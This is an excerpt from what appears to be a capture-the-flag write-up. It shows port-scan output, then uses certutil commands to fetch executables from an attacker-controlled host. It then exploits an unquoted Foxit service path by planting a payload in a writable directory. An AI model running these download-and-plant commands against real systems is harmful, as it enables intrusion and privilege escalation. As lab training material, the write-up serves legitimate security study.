...
6660-7007 open  irc       InspIRCd            (dozens of identical ports)
64738/tcp open  murmur    Murmur 1.2.10       (Mumble control port)
```
{{< /collapse >}}
...
```cmd
certutil.exe -urlcache -split -f http://192.168.49.206:8009/wp.exe c:\Users\daisy\Downloads\wp.exe
```
...
Because the path isn't quoted, Windows tries each space-delimited candidate in turn: `C:\Program.exe`, then `C:\Program Files (x86)\Foxit.exe`, then `C:\Program Files (x86)\Foxit Software\Foxit.exe`… The exploit only works if we can write one of those earlier candidates. Check the ACL on the service directory with `icacls`:

![icacls showing fluffy-pc\daisy holds (W) write on the Foxit Software directory](/images/ut99/icacls.png)

`fluffy-pc\daisy` holds **`(W)`** on `C:\Program Files (x86)\Foxit Software` — exactly the directory where `Foxit.exe` would be resolved first. Plant a payload there.
...
```cmd
certutil.exe -urlcache -split -f http://192.168.49.206:8009/Foxit.exe "C:\Program Files (x86)\Foxit Software\Foxit.exe"
```
